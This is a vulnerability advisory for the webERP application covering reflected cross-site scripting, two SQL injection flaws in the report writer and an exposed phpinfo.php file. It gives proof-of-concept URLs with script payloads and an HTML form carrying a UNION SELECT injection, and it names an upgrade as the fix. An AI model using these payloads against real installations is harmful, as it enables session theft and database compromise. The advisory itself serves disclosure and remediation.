Vulnerability Details:
High-Tech Bridge SA Security Research Lab has discovered multiple vulnerabilities in webERP, which can be exploited to perform information disclousure, cross-site scripting, sql injection attacks.

1) Input appended to the URL after multiple files is not properly sanitised before being returned to the user. 
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of an affected site.

The following PoC code is available:

http://[host]/doc/manual/manualcontents.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/index.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/AccountGroups.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/AccountSections.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/AddCustomerContacts.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E%3C/html%3E
http://[host]/AddCustomerNotes.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E%3C/html%3E
http://[host]/Areas.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/AddCustomerTypeNotes.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/AgedDebtors.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/AgedSuppliers.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

Successful exploitation of this vulnerabilities requires that Apache's directive "AcceptPathInfo" is set to "on" or "default" (default value is "default").

2) Input passed via the "reportid" GET parameter to /reportwriter/ReportMaker.php is not properly sanitised before being used in a SQL query.
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

The following PoC code is available:

http://[host]/reportwriter/ReportMaker.php?action=go&reportid=SQL_CODE_HERE

Successful exploitation of this vulnerability requires attacker to be registered and logged-in.

3) The "phpinfo.php" script is stored with insecure permissions inside the web root. 
This can be exploited to gain knowledge of sensitive information (e.g. PHP configuration details) by requesting the file directly.

The following PoC code is available:

http://[host]/phpinfo.php

4) Input passed via the "ReportID" POST parameter to /reportwriter/FormMaker.php is not properly sanitised before being used in a SQL query.
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

The following PoC code is available:


<form action="http://[host]/reportwriter/FormMaker.php" method="post">
<input type="hidden" name="ReportID" value="1 union select version(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20">
<input type="hidden" name="FormID" value="[FormID]" />
<input type="hidden" name="todo" value="Criteria Setup" />
<input type="submit" value="submit" id="btn"> 
</form>


Successful exploitation of this vulnerability requires attacker to be registered and logged-in.

Solution: Upgrade to 4.06RC2 or later version
